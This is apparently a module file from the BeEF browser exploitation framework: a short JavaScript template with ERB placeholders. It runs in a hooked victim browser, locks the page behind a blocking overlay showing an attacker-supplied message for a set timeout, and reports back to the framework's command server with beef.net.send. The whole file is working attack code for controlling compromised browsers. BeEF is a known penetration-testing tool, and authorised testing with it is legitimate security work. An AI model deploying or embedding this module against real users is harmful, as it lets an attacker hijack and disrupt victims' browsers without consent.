//
// Copyright (c) 2006-2017 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
  var timeout = '<%= @timeout %>' * 1000;

  var blockui = function() {
    $j.blockUI({ message: decodeURIComponent(beef.encode.base64.decode('<%= Base64.encode64(@message).delete("\n") %>')) });
    setTimeout("$j.unblockUI();", <%= @timeout %> * 1000);
  }

  blockui();
  beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=command sent');

});

